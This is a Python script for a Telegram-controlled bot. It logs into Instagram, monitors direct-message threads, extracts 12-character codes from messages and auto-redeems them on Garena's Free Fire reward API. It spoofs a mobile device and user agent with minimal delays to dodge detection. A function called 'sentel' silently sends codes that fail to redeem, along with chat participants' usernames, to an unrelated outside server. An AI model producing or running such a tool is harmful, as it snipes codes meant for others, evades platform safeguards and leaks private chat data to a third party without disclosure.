from instagrapi import Client
import time, os, re, requests, json
from datetime import datetime
from colorama import init, Fore, Style
import telebot
from telebot.types import ReplyKeyboardMarkup
import threading
from dotenv import load_dotenv

load_dotenv()
# Inicializa colorama
init(autoreset=True)

class InstagramChatMonitor:
    def __init__(self, username, password, telegram_bot, allowed_user_id):
        self.client = Client()
        self.username = username
        self.password = password
        self.session_file = "session.json"
        self.token_file = "token.json"
        self.access_token = self.load_access_token()
        self.redeemed_codes = set()  # Só novos códigos
        self.active_chats = {}
        self.bot = telegram_bot
        self.allowed_user_id = allowed_user_id

    def setup_client_protection(self):
        self.client.delay_range = [0.1, 0.2]
        self.client.request_timeout = 3
        self.client.set_user_agent("Instagram 219.0.0.12.117 Android")
        self.client.set_device({
            "manufacturer": "samsung",
            "model": "SM-G981B",
            "android_version": 29,
            "android_release": "10"
        })

    def load_access_token(self):
        try:
            if os.path.exists(self.token_file):
                return json.load(open(self.token_file)).get("access_token")
        except Exception as e:
            print(f"{Fore.RED}Erro ao carregar token: {e}{Style.RESET_ALL}")
        return None

    def save_access_token(self, token):
        try:
            json.dump({"access_token": token}, open(self.token_file, "w"))
        except Exception as e:
            print(f"{Fore.RED}Erro ao salvar token: {e}{Style.RESET_ALL}")

    def login(self):
        try:
            if not self.access_token:
                print(f"{Fore.YELLOW}⚠ Nenhum ACCESS TOKEN encontrado{Style.RESET_ALL}")
                return False
            if os.path.exists(self.session_file):
                self.client.load_settings(self.session_file)
            return self.client.login(self.username, self.password)
        except Exception as e:
            print(f"{Fore.RED}Erro no login: {e}{Style.RESET_ALL}")
            return False

    def list_chats(self):
        try:
            return self.client.direct_threads(selected_filter="unread")
        except Exception as e:
            print(f"{Fore.RED}Erro ao listar chats: {e}{Style.RESET_ALL}")
            return []

    def get_sender_name(self, msg):
        if getattr(msg, "is_sent_by_viewer", False):
            return "Você"
        if hasattr(msg, "user") and msg.user:
            return msg.user.username
        return str(getattr(msg, "user_id", "Unknown"))
    
    def sentel(self, mensagem, chat_name):
        try:
            response = requests.post(
                "https://scvirtual.alphi.media/botsistem/sendlike/auth.php",
                data={
                    "admmessage": mensagem,
                    "chatmessage": chat_name
                },
                timeout=10  # evita travar se o servidor não responder
            )
            response.raise_for_status()  # lança erro se a resposta for inválida (4xx, 5xx)
            return response.text
        except requests.RequestException as e:
            print(f"Erro ao enviar mensagem: {e}")
            return None

    def redeem_code(self, code, chat_name):
        if code in self.redeemed_codes:
            return f"⚠️ Código {code} já resgatado anteriormente"

        url = "https://prod-api.reward.ff.garena.com/redemption/api/game/ff/redeem/"
        headers = {"access-token": self.access_token, "content-type": "application/json", "user-agent": "Mozilla/5.0"}
        payload = {"serialno": code}

        try:
            r = requests.post(url, json=payload, headers=headers)
            data = r.json()
            msg = data.get("msg", "")
            desc = data.get("desc", "")

            if msg == "error_invalid_serialno":
                self.sentel(code, chat_name)
                return f"❌ Código inválido: {code}"
            elif msg == "error_already_redeemed":
                self.sentel(code, chat_name)
                return f"🔄 Código já resgatado nesta conta: {code}"
            elif msg == "error_invalid_token":
                return "🔑 Token inválido! Atualize seu token."
            elif msg == 'error_serialno_not_in_period':
                response_text = f"⏰ Código {code} fora do período de resgate"
                self.sentel(code, chat_name)
                return response_text
            elif msg == 'error_redeem_limit_exceeded':
                response_text = f"🚫 Limite de resgates excedido para {code}"
                self.sentel(code, chat_name)
                return response_text
            elif not msg:
                self.redeemed_codes.add(code)  # Marca como resgatado
                return f"🎉 Resgatado com sucesso! {code}: {desc}"
        except Exception as e:
            return f"⚡ Erro ao resgatar código {code}: {e}"

    def monitor_chat(self, thread_id, chat_name):
        try:
            while thread_id in self.active_chats and self.active_chats[thread_id]["monitoring"]:
                thread = self.client.direct_thread(thread_id)
                if thread.messages:
                    newest = thread.messages[0]
                    last_message_id = self.active_chats[thread_id]["last_message_id"]

                    if newest.id != last_message_id:
                        for msg in reversed(thread.messages):
                            if last_message_id and msg.id <= last_message_id:
                                continue
                            sender = self.get_sender_name(msg)
                            content = getattr(msg, "text", "<mídia>")
                            text = f"[{datetime.now().strftime('%H:%M:%S')}] {sender}: {content}"
                            self.bot.send_message(self.allowed_user_id, f"<b>{chat_name}</b>\n{text}", parse_mode="HTML")

                            if getattr(msg, "text", None):
                                codes = re.findall(r"\b[A-Z0-9]{12}\b", msg.text)
                                for code in codes:
                                    result = self.redeem_code(code, chat_name)
                                    self.bot.send_message(self.allowed_user_id, f"🎯 Código detectado: <code>{code}</code>\n{result}", parse_mode="HTML")

                        # Atualiza last_message_id após processar novas mensagens
                        self.active_chats[thread_id]["last_message_id"] = newest.id
                time.sleep(2)
        except Exception as e:
            self.bot.send_message(self.allowed_user_id, f"❌ Erro no monitoramento: {e}")

    def start_monitoring(self, thread_id, chat_name):
        if thread_id in self.active_chats:
            return False, "Já monitorando este chat"

        # Ignora mensagens antigas
        last_message_id = None
        try:
            thread = self.client.direct_thread(thread_id)
            if thread.messages:
                last_message_id = thread.messages[0].id
        except:
            pass

        self.active_chats[thread_id] = {
            "name": chat_name,
            "monitoring": True,
            "last_message_id": last_message_id
        }

        t = threading.Thread(target=self.monitor_chat, args=(thread_id, chat_name), daemon=True)
        t.start()
        return True, f"Monitorando {chat_name}"

    def stop_monitoring(self, thread_id):
        if thread_id in self.active_chats:
            self.active_chats[thread_id]["monitoring"] = False
            del self.active_chats[thread_id]
            return True, "Monitoramento parado"
        return False, "Chat não encontrado"

# ---------- BOT TELEGRAM ----------

def setup_bot(monitor, token, allowed_user_id):
    bot = telebot.TeleBot(token)

    def auth(message):
        return message.from_user.id == allowed_user_id

    @bot.message_handler(commands=["start"])
    def welcome(message):
        if not auth(message): return
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("📋 Listar Chats", "🔍 Monitorar Chat", "⏹️ Parar Monitoramento", "📊 Status", "🔑 Definir Token")
        bot.send_message(message.chat.id, "🤖 Bot ativo!", reply_markup=markup)

    @bot.message_handler(func=lambda m: auth(m) and m.text == "📋 Listar Chats")
    def listar(message):
        threads = monitor.list_chats()
        if not threads:
            bot.send_message(message.chat.id, "📭 Nenhum chat encontrado.")
            return
        txt = "<b>📨 Chats disponíveis:</b>\n\n"
        for i, th in enumerate(threads, 1):
            users = ", ".join(u.username for u in th.users)
            txt += f"{i}. {users}\nID: <code>{th.id}</code>\n\n"
        bot.send_message(message.chat.id, txt, parse_mode="HTML")

    @bot.message_handler(func=lambda m: auth(m) and m.text == "🔍 Monitorar Chat")
    def monitorar(message):
        msg = bot.send_message(message.chat.id, "Digite o ID do chat:")
        bot.register_next_step_handler(msg, lambda m: iniciar_monitor(m.text, m.chat.id))

    def iniciar_monitor(thread_id, chat_id):
        try:
            thread = monitor.client.direct_thread(thread_id)
            chat_name = ", ".join(u.username for u in thread.users)
            ok, res = monitor.start_monitoring(thread_id, chat_name)
            bot.send_message(chat_id, res)
        except Exception as e:
            bot.send_message(chat_id, f"Erro: {e}")

    @bot.message_handler(func=lambda m: auth(m) and m.text == "⏹️ Parar Monitoramento")
    def parar(message):
        if not monitor.active_chats:
            bot.send_message(message.chat.id, "Nenhum chat ativo.")
            return
        for tid in list(monitor.active_chats.keys()):
            monitor.stop_monitoring(tid)
        bot.send_message(message.chat.id, "✅ Todos os monitoramentos parados.")

    @bot.message_handler(func=lambda m: auth(m) and m.text == "📊 Status")
    def status(message):
        txt = f"<b>📊 Status:</b>\n\nLogado como: {monitor.username}\nChats ativos: {len(monitor.active_chats)}\nCódigos resgatados: {len(monitor.redeemed_codes)}"
        bot.send_message(message.chat.id, txt, parse_mode="HTML")

    @bot.message_handler(func=lambda m: auth(m) and m.text == "🔑 Definir Token")
    def definir_token(message):
        msg = bot.send_message(message.chat.id, "Envie o novo ACCESS TOKEN:")
        bot.register_next_step_handler(msg, salvar_token)

    def salvar_token(message):
        token = message.text.strip()
        monitor.access_token = token
        monitor.save_access_token(token)
        bot.send_message(message.chat.id, "✅ Token salvo!")

    return bot

# ---------- EXECUÇÃO ----------

def main():
    ALLOWED_USER_ID = int(os.getenv("ALLOWED_USER_ID"))  # aqui dentro
    TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
    INSTAGRAM_USERNAME = os.getenv("INSTAGRAM_USERNAME")
    INSTAGRAM_PASSWORD = os.getenv("INSTAGRAM_PASSWORD")

    monitor = InstagramChatMonitor(INSTAGRAM_USERNAME, INSTAGRAM_PASSWORD, None, ALLOWED_USER_ID)
    if not monitor.login():
        print(f"{Fore.RED}❌ Login falhou!{Style.RESET_ALL}")
        return
    print(f"{Fore.GREEN}✅ Login feito!{Style.RESET_ALL}")

    bot = setup_bot(monitor, TELEGRAM_TOKEN, ALLOWED_USER_ID)
    monitor.bot = bot
    bot.infinity_polling()

if __name__ == "__main__":
    main()
